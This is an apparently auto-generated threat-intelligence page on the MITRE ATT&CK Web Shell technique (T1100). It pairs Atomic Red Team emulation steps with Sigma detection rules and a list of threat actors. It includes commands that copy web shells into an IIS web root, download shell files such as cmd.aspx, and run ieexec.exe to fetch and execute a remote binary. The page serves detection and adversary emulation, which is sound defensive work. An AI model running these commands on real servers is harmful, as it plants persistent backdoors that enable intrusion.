
# Web Shell

## Description

### MITRE Description

> A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client). (Citation: Lee 2013)

Web shells may serve as [Redundant Access](https://attack.mitre.org/techniques/T1108) or as a persistence mechanism in case an adversary's primary access methods are detected and removed.

## Additional Attributes

* Bypass: None
* Effective Permissions: ['SYSTEM', 'User']
* Network: intentionally left blank
* Permissions: None
* Platforms: ['Linux', 'Windows', 'macOS']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1100

## Potential Commands

```
xcopy #{web_shells} C:\inetpub\wwwroot

xcopy PathToAtomicsFolder\T1100\src\ #{web_shell_path}

ieexec.exe http://*:8080/bypass.exe
```

## Commands Dataset

```
[{'command': 'xcopy #{web_shells} C:\\inetpub\\wwwroot\n',
  'name': None,
  'source': 'atomics/T1100/T1100.yaml'},
 {'command': 'xcopy PathToAtomicsFolder\\T1100\\src\\ #{web_shell_path}\n',
  'name': None,
  'source': 'atomics/T1100/T1100.yaml'},
 {'command': 'ieexec.exe http://*:8080/bypass.exe',
  'name': None,
  'source': 'Threat Hunting Tables'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'date': '2018/09/09',
                  'description': 'Detects a highly relevant Antivirus alert '
                                 'that reports a web shell',
                  'detection': {'condition': 'selection',
                                'selection': {'Signature': ['PHP/Backdoor*',
                                                            'JSP/Backdoor*',
                                                            'ASP/Backdoor*',
                                                            'Backdoor.PHP*',
                                                            'Backdoor.JSP*',
                                                            'Backdoor.ASP*',
                                                            '*Webshell*']}},
                  'falsepositives': ['Unlikely'],
                  'fields': ['FileName', 'User'],
                  'id': 'fdf135a2-9241-4f96-a114-bb404948f736',
                  'level': 'critical',
                  'logsource': {'product': 'antivirus'},
                  'modified': '2019/10/04',
                  'references': ['https://www.nextron-systems.com/2018/09/08/antivirus-event-analysis-cheat-sheet-v1-4/'],
                  'tags': ['attack.persistence', 'attack.t1100'],
                  'title': 'Antivirus Web Shell Detection'}},
 {'data_source': {'author': 'Ilyas Ochkov, Beyu Denis, oscd.community',
                  'date': '2019/10/12',
                  'description': 'Detects posible command execution by web '
                                 'application/web shell',
                  'detection': {'condition': 'selection',
                                'selection': {'SYSCALL': 'execve',
                                              'key': 'detect_execve_www',
                                              'type': 'SYSCALL'}},
                  'falsepositives': ['Admin activity',
                                     'Crazy web applications'],
                  'id': 'c0d3734d-330f-4a03-aae2-65dacc6a8222',
                  'level': 'critical',
                  'logsource': {'product': 'linux', 'service': 'auditd'},
                  'modified': '2019/11/04',
                  'references': ['personal experience'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1100'],
                  'title': 'Webshell Remote Command Execution'}},
 {'data_source': {'author': 'Beyu Denis, oscd.community',
                  'date': '2019/10/22',
                  'description': 'Posible webshell file creation on a static '
                                 'web site',
                  'detection': {'condition': 'selection_1 and ( selection_2 '
                                             'and selection_3 ) or selection_1 '
                                             'and ( selection_4 and '
                                             'selection_5 ) or selection_1 and '
                                             'selection_6',
                                'selection_1': {'EventID': 11},
                                'selection_2': {'TargetFilename|contains': '\\inetpub\\wwwroot\\'},
                                'selection_3': {'TargetFilename|contains': ['.asp',
                                                                            '.ashx',
                                                                            '.ph']},
                                'selection_4': {'TargetFilename|contains': ['\\www\\',
                                                                            '\\htdocs\\',
                                                                            '\\html\\']},
                                'selection_5': {'TargetFilename|contains': '.ph'},
                                'selection_6': [{'TargetFilename|contains|all': ['\\',
                                                                                 '.jsp']},
                                                {'TargetFilename|contains|all': ['\\cgi-bin\\',
                                                                                 '.pl']}]},
                  'falsepositives': ['Legitimate administrator or developer '
                                     'creating legitimate executable files in '
                                     'a web application folder'],
                  'id': '39f1f9f2-9636-45de-98f6-a4046aa8e4b9',
                  'level': 'critical',
                  'logsource': {'product': 'windows', 'service': 'sysmon'},
                  'modified': '2019/11/04',
                  'references': ['PT ESC rule and personal experience'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1100'],
                  'title': 'Windows webshell creation'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects a suspicious program execution in a '
                                 'web service root folder (filter out false '
                                 'positives)',
                  'detection': {'condition': 'selection and not filter',
                                'filter': {'Image': ['*bin\\\\*',
                                                     '*\\Tools\\\\*',
                                                     '*\\SMSComponent\\\\*'],
                                           'ParentImage': ['*\\services.exe']},
                                'selection': {'Image': ['*\\wwwroot\\\\*',
                                                        '*\\wmpub\\\\*',
                                                        '*\\htdocs\\\\*']}},
                  'falsepositives': ['Various applications',
                                     'Tools that include ping or nslookup '
                                     'command invocations'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '35efb964-e6a5-47ad-bbcd-19661854018d',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1100'],
                  'title': 'Execution in Webserver Root Folder'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects suspicious IIS native-code module '
                                 'installations via command line',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['*\\APPCMD.EXE '
                                                              'install module '
                                                              '/name:*']}},
                  'falsepositives': ['Unknown as it may vary from organisation '
                                     'to arganisation how admins use to '
                                     'install IIS modules'],
                  'id': '9465ddf4-f9e4-4ebd-8d98-702df3a93239',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2012/12/11',
                  'references': ['https://researchcenter.paloaltonetworks.com/2018/01/unit42-oilrig-uses-rgdoor-iis-backdoor-targets-middle-east/'],
                  'status': 'experimental',
                  'tags': ['attack.persistence', 'attack.t1100'],
                  'title': 'IIS Native-Code Module Command Line Installation'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2017/01/01',
                  'description': 'Detects certain command line parameters '
                                 'often used during reconnaissance activity '
                                 'via web shells',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['*whoami*',
                                                              '*net user *',
                                                              '*ping -n *',
                                                              '*systeminfo',
                                                              '*&cd&echo*',
                                                              '*cd /d*'],
                                              'ParentImage': ['*\\apache*',
                                                              '*\\tomcat*',
                                                              '*\\w3wp.exe',
                                                              '*\\php-cgi.exe',
                                                              '*\\nginx.exe',
                                                              '*\\httpd.exe']}},
                  'falsepositives': ['unknown'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': 'bed2a484-9348-4143-8a8a-b801c979301c',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'modified': '2019/10/26',
                  'reference': ['https://www.fireeye.com/blog/threat-research/2013/08/breaking-down-the-china-chopper-web-shell-part-ii.html'],
                  'tags': ['attack.privilege_escalation',
                           'attack.persistence',
                           'attack.t1100'],
                  'title': 'Webshell Detection With Command Line Keywords'}},
 {'data_source': {'author': 'Thomas Patzke',
                  'description': 'Web servers that spawn shell processes could '
                                 'be the result of a successfully placed web '
                                 'shell or an other attack',
                  'detection': {'condition': 'selection',
                                'selection': {'Image': ['*\\cmd.exe',
                                                        '*\\sh.exe',
                                                        '*\\bash.exe',
                                                        '*\\powershell.exe'],
                                              'ParentImage': ['*\\w3wp.exe',
                                                              '*\\httpd.exe',
                                                              '*\\nginx.exe',
                                                              '*\\php-cgi.exe']}},
                  'falsepositives': ['Particular web applications may spawn a '
                                     'shell process legitimately'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '8202070f-edeb-4d31-a010-a26c72ac5600',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'status': 'experimental',
                  'tags': ['attack.privilege_escalation',
                           'attack.persistence',
                           'attack.t1100'],
                  'title': 'Shells Spawned by Web Servers'}}]
```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Web Shell': {'atomic_tests': [{'dependencies': [{'description': 'Web '
                                                                                          'shell '
                                                                                          'must '
                                                                                          'exist '
                                                                                          'on '
                                                                                          'disk '
                                                                                          'at '
                                                                                          'specified '
                                                                                          'location '
                                                                                          '(#{web_shells})\n',
                                                                           'get_prereq_command': 'New-Item '
                                                                                                 '-Type '
                                                                                                 'Directory '
                                                                                                 '(split-path '
                                                                                                 '#{web_shells}) '
                                                                                                 '-ErrorAction '
                                                                                                 'ignore '
                                                                                                 '| '
                                                                                                 'Out-Null\n'
                                                                                                 'Invoke-WebRequest '
                                                                                                 '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/b.jsp" '
                                                                                                 '-OutFile '
                                                                                                 '"#{web_shells}/b.jsp"\n'
                                                                                                 'Invoke-WebRequest '
                                                                                                 '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/tests.jsp" '
                                                                                                 '-OutFile '
                                                                                                 '"#{web_shells}/test.jsp"\n'
                                                                                                 'Invoke-WebRequest '
                                                                                                 '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1100/src/cmd.aspx" '
                                                                                                 '-OutFile '
                                                                                                 '"#{web_shells}/cmd.aspx"\n',
                                                                           'prereq_command': 'if '
                                                                                             '(Test-Path '
                                                                                             '#{web_shells}) '
                                                                                             '{exit '
                                                                                             '0} '
                                                                                             'else '
                                                                                             '{exit '
                                                                                             '1}\n'}],
                                                         'dependency_executor_name': 'powershell',
                                                         'description': 'This '
                                                                        'test '
                                                                        'simulates '
                                                                        'an '
                                                                        'adversary '
                                                                        'leveraging '
                                                                        'Web '
                                                                        'Shells '
                                                                        'by '
                                                                        'simulating '
                                                                        'the '
                                                                        'file '
                                                                        'modification '
                                                                        'to '
                                                                        'disk.\n'
                                                                        'Idea '
                                                                        'from '
                                                                        'APTSimulator.\n'
                                                                        'cmd.aspx '
                                                                        'source '
                                                                        '- '
                                                                        'https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx\n',
                                                         'executor': {'cleanup_command': 'del '
                                                                                         '#{web_shell_path} '
                                                                                         '>nul '
                                                                                         '2>&1\n',
                                                                      'command': 'xcopy '
                                                                                 '#{web_shells} '
                                                                                 '#{web_shell_path}\n',
                                                                      'name': 'command_prompt'},
                                                         'input_arguments': {'web_shell_path': {'default': 'C:\\inetpub\\wwwroot',
                                                                                                'description': 'The '
                                                                                                               'path '
                                                                                                               'to '
                                                                                                               'drop '
                                                                                                               'the '
                                                                                                               'web '
                                                                                                               'shell',
                                                                                                'type': 'string'},
                                                                             'web_shells': {'default': 'PathToAtomicsFolder\\T1100\\src\\',
                                                                                            'description': 'Path '
                                                                                                           'of '
                                                                                                           'Web '
                                                                                                           'Shell',
                                                                                            'type': 'path'}},
                                                         'name': 'Web Shell '
                                                                 'Written to '
                                                                 'Disk',
                                                         'supported_platforms': ['windows']}],
                                       'attack_technique': 'T1100',
                                       'display_name': 'Web Shell'}},
 {'Threat Hunting Tables': {'chain_id': '100211',
                            'commandline_string': 'http://*:8080/bypass.exe',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': 'https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Ieexec.md',
                            'loaded_dll': '',
                            'mitre_attack': 'T1100',
                            'mitre_caption': 'web_shell',
                            'os': 'windows',
                            'parent_process': 'ieexec.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations

None

# Actors


* [APT32](../actors/APT32.md)

* [OilRig](../actors/OilRig.md)
    
* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [Deep Panda](../actors/Deep-Panda.md)
    
* [APT39](../actors/APT39.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
